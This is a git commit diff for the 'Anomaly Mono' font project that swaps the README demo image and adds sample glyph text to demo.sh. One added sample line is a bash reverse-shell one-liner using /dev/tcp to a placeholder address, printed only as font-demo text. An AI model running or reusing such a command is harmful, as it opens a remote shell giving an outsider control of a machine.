7f38e6bd23ad53cddf8ebe069ca1df62a7adb7c6
Ben Busby <ben.busby7@gmail.com>
2019-07-11 22:38:06 -0600

    Updated screenshot and demo script, removed gif

--- README.md
+++ README.md
@@ -1,3 +1,3 @@
 <p align="center">
-  <img style="width: 800px" src="https://github.com/benbusby/anomaly-mono/blob/master/anomaly_mono.gif" alt="anomaly mono gif" />
+  <img src="https://github.com/benbusby/anomaly-mono/blob/master/anomaly_mono.png" alt="anomaly mono demo shot" />
 </p>
--- demo.sh
+++ demo.sh
@@ -8,7 +8,17 @@ Anomaly Mono
 ABCDEFGHIJKLMNOPQRSTUVWXYZ
 abcdefghijklmnopqrstuvwxyz
 012346789
-!@#$%^&*()
+!@#$%^&*()_+-={|}
+[/]~:;"'<>.,?/
+
+public static void main(String[] args) { }
+function square(n) { return n * n; }
+sum = lambda x, y : x + y
+(x ^= y), (y ^= x), (x ^= y);
+bash -i >& /dev/tcp/192.168.0.XX 0>&1
+379965d428a042f18113f3c2ff7f0e15
+
+___
 EOM
 
 columns="$(tput cols)"
